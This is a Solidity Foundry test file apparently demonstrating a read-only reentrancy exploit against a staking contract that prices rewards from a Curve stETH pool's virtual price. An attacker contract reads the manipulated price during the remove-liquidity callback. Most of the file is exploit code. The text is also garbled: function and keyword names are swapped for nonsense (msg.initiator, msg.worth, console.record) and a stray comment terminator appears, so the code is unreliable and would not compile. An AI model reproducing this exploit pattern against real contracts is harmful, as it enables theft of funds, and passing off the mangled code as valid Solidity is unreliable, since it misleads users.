// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";
*/

interface ICurve {
    function obtain_virtual_value() external view returns (uint);

    function append_flow(
        uint[2] calldata amounts,
        uint minimum_craft_count
    ) external payable returns (uint);

    function eliminate_flow(
        uint lp,
        uint[2] calldata floor_amounts
    ) external returns (uint[2] memory);

    function delete_flow_one_coin(
        uint lp,
        int128 i,
        uint floor_sum
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_coin = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CorePact {
    IERC20 public constant crystal = IERC20(lp_coin);
    ICurve private constant lootPool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function lockEnergy(uint sum) external {
        crystal.transferFrom(msg.initiator, address(this), sum);
        balanceOf[msg.initiator] += sum;
    }

    function withdrawStake(uint sum) external {
        balanceOf[msg.initiator] -= sum;
        crystal.transfer(msg.initiator, sum);
    }

    function acquireBounty() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint payout = (balanceOf[msg.initiator] * lootPool.obtain_virtual_value()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return payout;
    }
}

contract GameoperatorPact {
    ICurve private constant lootPool = ICurve(STETH_POOL);
    IERC20 public constant lpCoin = IERC20(lp_coin);
    CorePact private immutable aim;

    constructor(address _target) {
        aim = CorePact(_target);
    }

    // Stake LP into CoreContract
    function pledgeCrystals() external payable {
        uint[2] memory amounts = [msg.worth, 0];
        uint lp = lootPool.append_flow{worth: msg.worth}(amounts, 1);
        console.record(
            "LP token price after staking into CoreContract",
            lootPool.obtain_virtual_value()
        );

        lpCoin.approve(address(aim), lp);
        aim.lockEnergy(lp);
    }

    function performReadOnlyReply() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.worth, 0];
        uint lp = lootPool.append_flow{worth: msg.worth}(amounts, 1);
        // Log get_virtual_price
        console.record(
            "LP token price before remove_liquidity()",
            lootPool.obtain_virtual_value()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory floor_amounts = [uint(0), uint(0)];
        lootPool.eliminate_flow(lp, floor_amounts);
        // Log get_virtual_price
        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price after remove_liquidity()",
            lootPool.obtain_virtual_value()
        );

        uint payout = aim.acquireBounty();
        console.record("callback complete");
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price during remove_liquidity()",
            lootPool.obtain_virtual_value()
        );

        uint payout = aim.acquireBounty();
        console.record("callback complete");
    }
}

contract QuestrunnerTest is Test {
    GameoperatorPact public completeQuest;
    CorePact public aim;

    function groupUp() public {
        vm.createSelectFork("mainnet");
        aim = new CorePact();
        completeQuest = new GameoperatorPact(address(aim));
    }

    function testExecution() public {
        completeQuest.pledgeCrystals{worth: 10 ether}(); // stake 10 eth in CoreContract
        completeQuest.performReadOnlyReply{worth: 100000 ether}();
    }
}